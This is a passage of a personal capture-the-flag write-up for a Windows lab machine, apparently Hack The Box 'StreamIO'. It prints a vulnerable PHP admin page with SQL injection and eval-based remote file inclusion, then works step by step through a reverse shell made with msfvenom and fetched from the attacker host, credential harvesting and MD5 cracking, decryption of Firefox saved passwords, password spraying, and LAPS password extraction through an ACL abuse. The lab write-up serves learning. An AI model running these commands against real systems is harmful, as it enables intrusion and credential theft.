PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==
```

i then echo this to decode the base64 to get the whole html file:
`echo "<the above base64 string>" | base64 --decode`
gives me:

```
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

towards the bottom we see this line:
`eval(file_get_contents($_POST['include']));`

this is easy exploit as eval can run system commands:
I will make a file called: rce.php
```
system("whoami");
```

and serve it on my python server at port 80....

next i will make a get request to:
`https://streamio.htb/admin/?debug=master.php`

and then in burpsuite change the req to POST and include a body and content-type header:
```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=6abob5jjclac8a92hg78rbuet5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

include=http://10.10.14.4/rce.php
```

at the bottom of the response we see:
```
...
form method="POST">
<input name="include" hidden>
</form>
streamio\yoshihide
		</div>
```

now that we have RCE lets get a rev shell:
ill run:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe > revshell.exe`


and then change the rce.php:
```
system("powershell -c iwr -uri http://10.10.14.4/revshell.exe -OutFile revshell.exe");
```

lets run it and then execute it!
on my python server i see:
`10.10.11.158 - - [03/Sep/2025 21:15:49] "GET /revshell.exe HTTP/1.1" 200 -`

now that we ran it we can change the rce.php to execute that file after we start our `nc -lvnp 9001` then execute it!

```
nc -lvnp 9001  
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.158] 65408
```

NICE!

we are yoshihide in shell via whoami

i cant get into any user directories so i will run good ole winPEASx64.exe

```
iwr -uri http://10.10.14.4/winPEASx64.exe -OutFile winPEASx64.exe
```

`./winPEASx64.exe`
...

not much here might need better use permissions before we run this again...

lets look through the web directories and see if we find anything....

```
Get-ChildItem -Recurse C:\inetpub\streamio.htb\ -File | Select-String -Pattern 'user|username|uid|pass|pwd|password'
```
...

could have also run:
```
dir -recurse *.php | select-string -pattern "database"
```

looking thru i find this:
```
streamio.htb\login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
...

streamio.htb\register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 
'B1@hx31234567890');
...

streamio.htb\admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 
'B1@hx31234567890');

```

no other creds are found.... lets try and use these now...

i went and looked in the files and i see this so:
`$handle = sqlsrv_connect('(local)',$connection);`

we have to somehow run a sql queries and find the database(remember we queried the watch.steam.io db before, the is the stream.io, possible different user/pass combos.... i am assuming)

searching in C:\Program Files:
````
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
````

or i could have ran:
```
where.exe sqlcmd
```

but now we know how we can execute:
remember above tables:
```
master
model
msdb
STREAMIO
streamio_backup
termpdb
```
I will google syntax as i am not super good with this...
from:
`https://www.datasunrise.com/knowledge-center/connecting-to-databases-using-sqlcmd/`

i find this example:
`sqlcmd -S SQLSERVER01 -U admin -P password123 -d AdventureWorks -Q "SELECT TOP 10 * FROM Sales.SalesOrderHeader"`
lets run something similar:
```
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"

movies
users
```

we want to look here as we were able to access earlier, only could access main db streamio:
```
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```

```
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5 
```

again lets try and crack these suckers like we did above:

i made backupcreds.txt:
```
nikk37:389d14cb8e4e9b94b137deb1caf0612a
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
```

as these look like md5 hashes we will use that again:
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt backupcreds.txt 
Using default input encoding: UTF-8
Loaded 8 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 5 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
get_dem_girls2@yahoo.com (nikk37)     
1g 0:00:00:01 DONE (2025-09-03 23:06) 0.9803g/s 14062Kp/s 14062Kc/s 63996KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

`get_dem_girls2@yahoo.com (nikk37)`
(some password  :p lol)

with these I saw earlier that there is a nikk37 in Users dir and winrm port 5985 is open:
`evil-winrm -i 10.10.11.158 -u nikk37 -p get_dem_girls2@yahoo.com`

and i am in!

```
*Evil-WinRM* PS C:\Users\nikk37\Documents> cat ../Desktop/user.txt
110f6edabbbb698***************
```

USER PWN!

---

### Priv Esc

Lets try running winpeas again...
in winpeas i found this:
```
 Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

i took a look and there is also a logins.json file there as well.... they look they are bas64 encrypted but when i try to decrypt them they are not(i get back blob)....
after some research, looks like i can decrypt these on my kali machine by downloading:
```
- logins.json
    
- key4.db
    
- cert9.db
```

next i can download and run:
`firefox_decrypt.py` : `https://github.com/unode/firefox_decrypt`

ill put the 3 files into a dir called `streamio_ff_profile`, then run:

```
python3 firefox_decrypt.py ./streamio_ff_profile 
2025-09-05 20:22:02,299 - WARNING - profile.ini not found in ./streamio_ff_profile
2025-09-05 20:22:02,299 - WARNING - Continuing and assuming './streamio_ff_profile' is a profile location

Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'password@12'
```

i also check the logins_backup:
```
Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'
```

i put all the usernames and passwords into seperate files and run below command:
```
crackmapexec smb 10.10.11.158 -u slackUsers -p slackPasswords --continue-on-success                
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE 
```

```
streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

WORKS!

lets use bloodhound-python:
```
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 05S
INFO: Compressing output into 20250905214701_bloodhound.zip
```

now i want to note i tried bloodhound with nikki by uploading and the data is different so watch out!

![[Pasted image 20250905214930.png]]

found this and on core staff:
![[Pasted image 20250905214957.png]]
has READLAPSPASSWORD permissions!

golden ticket to DC!

```
$User = 'STREAMIO\JDGODD'
$Pass = '<<<JDGODD_Plaintext_Password_Here>>>'   # put the real password here
$Sec  = ConvertTo-SecureString $Pass -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($User,$Sec)

Import-Module .\PowerView.ps1
```

```
Set-DomainObjectOwner -Identity "CORE STAFF" -OwnerIdentity $User -Credential $Cred

Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity $User -Rights WriteMembers -Credential $Cred

Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $Cred

OR
Get-ADComputer -Identity DC `
  -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' `
  -Credential $Cred |
Select-Object Name,
  @{n='LAPS';e={$_.‘ms-Mcs-AdmPwd’}},
  @{n='Expires';e={[DateTime]::FromFileTime($_.‘ms-Mcs-AdmPwdExpirationTime’)}}
```

we get password: 

OR we can run:
```
$dcHost = 'DC.streamIO.htb'   # or the DC IP
$dn     = 'CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb'
$user   = 'STREAMIO\JDGODD'
$pass   = 'JDg0dd1s@d0p3cr3@t0r'

# Authentication flags: Secure (Negotiate) + Signing + Sealing (== LDAP integrity & privacy)
$auth = [System.DirectoryServices.AuthenticationTypes]::Secure `
      -bor [System.DirectoryServices.AuthenticationTypes]::Signing `
      -bor [System.DirectoryServices.AuthenticationTypes]::Sealing

# Bind directly to the DC object DN
$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dcHost/$dn",$user,$pass,$auth)

# Force server-side read to fail fast if creds/flags are wrong
$null = $de.RefreshCache()

# Read legacy LAPS attributes
$pwd = $de.Properties['ms-Mcs-AdmPwd'].Value
$exp = $de.Properties['ms-Mcs-AdmPwdExpirationTime'].Value
if ($exp) { $exp = [DateTime]::FromFileTime([int64]$exp) }

"Password: $pwd"
"Expires : $exp"

```

password is:
`!&Pp.-ti+I)59@`

we should be able to winrm into machine:
`evil-winrm -u administrator -p '!&Pp.-ti+I)59@' -i 10.10.11.158`

had a small heart attack, when the flag was not on admin's desktop(this took me hours to complete ugh)....

i checked the other user martin as i know there was another user and sure enough there it was on his desktop:
```
C:\Users\Martin\Desktop> cat root.txt
1ef3d256e29189c32**********
```

DC PWNED!